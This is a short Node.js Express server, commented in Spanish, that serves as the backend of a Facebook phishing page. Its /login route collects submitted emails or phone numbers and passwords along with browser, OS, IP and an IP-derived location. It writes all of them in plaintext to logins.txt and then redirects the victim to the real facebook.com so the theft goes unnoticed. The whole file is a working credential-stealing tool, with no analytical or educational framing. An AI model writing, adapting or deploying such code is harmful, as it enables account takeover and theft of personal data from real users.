const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');

const app = express();
const PORT = 3000;

// Middleware para parsear bodies URL-encoded
app.use(express.urlencoded({ extended: false }));
// Servir archivos estáticos (HTML/CSS)
app.use(express.static(path.join(__dirname, 'public')));

// Function to get real IP
function getClientIP(req) {
  return req.headers['x-forwarded-for'] ||
         req.headers['x-real-ip'] ||
         req.connection.remoteAddress ||
         req.socket.remoteAddress ||
         req.ip ||
         'Unknown';
}

// Function to get location from IP
function getLocationFromIP(ip, callback) {
  if (ip === 'Unknown' || ip === '::1' || ip === '127.0.0.1') {
    return callback(null, 'Local');
  }
  const url = `https://ipapi.co/${ip}/json/`;
  https.get(url, (res) => {
    let data = '';
    res.on('data', (chunk) => {
      data += chunk;
    });
    res.on('end', () => {
      try {
        const json = JSON.parse(data);
        const location = `${json.city || 'Unknown'}, ${json.region || ''} ${json.country_name || 'Unknown'}`.trim();
        callback(null, location);
      } catch (err) {
        callback(err, 'Unknown');
      }
    });
  }).on('error', (err) => {
    callback(err, 'Unknown');
  });
}

// Ruta para recibir el POST del formulario
app.post('/login', async (req, res) => {
  const { email_or_phone = '', password = '', browser = '', os = '' } = req.body;
  const ip = getClientIP(req);

  // Obtener ubicación
  const location = await new Promise((resolve) => {
    getLocationFromIP(ip, (err, loc) => {
      resolve(loc);
    });
  });

  // Guardar en archivo (append). Añadimos timestamp.
  const now = new Date().toISOString();
  const safeEmail = email_or_phone.replace(/\r?\n/g, ' ');
  const safePass = password.replace(/\r?\n/g, ' ');
  const safeBrowser = browser.replace(/\r?\n/g, ' ');
  const safeOs = os.replace(/\r?\n/g, ' ');
  const safeLocation = location.replace(/\r?\n/g, ' ');
  const line = `${now} | IP: ${ip} | Location: ${safeLocation} | OS: ${safeOs} | Browser: ${safeBrowser} | user: ${safeEmail} | pass: ${safePass}\n`;

  const logfile = path.join(__dirname, 'logins.txt');
  fs.appendFile(logfile, line, (err) => {
    if (err) {
      console.error('Error escribiendo en log:', err);
      // En caso de error, redirigimos igual (para no exponer fallo).
    }
    // Después de guardar (o si hay error), redirigimos al sitio público de Facebook
    res.redirect('https://www.facebook.com/');
  });
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
